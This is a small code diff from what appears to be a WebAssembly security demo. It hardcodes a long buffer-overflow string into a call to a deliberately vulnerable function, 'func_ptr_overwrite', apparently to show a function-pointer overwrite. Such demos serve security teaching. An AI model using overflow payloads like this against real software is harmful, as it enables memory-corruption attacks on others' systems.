@@ -172,8 +172,10 @@ void EMSCRIPTEN_KEEPALIVE func_ptr_overwrite(char *str) {
     
       Module.onRuntimeInitialized = function() {
 
-        $("#exploit-btn").click(() => {
-          Module.ccall('func_ptr_overwrite', 'None', ['string'], [$("#string").val()]);
+        $("#exploit-btn").click(() => {            
+          
+          Module.ccall('func_ptr_overwrite', 'None', ['string'], ["AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6"]);
+
           
         })
         // var normal = binary.ccall('func_ptr_overwrite2', 'None', ['string', 'string'], ["Bob", "22"]); // Normal behavior
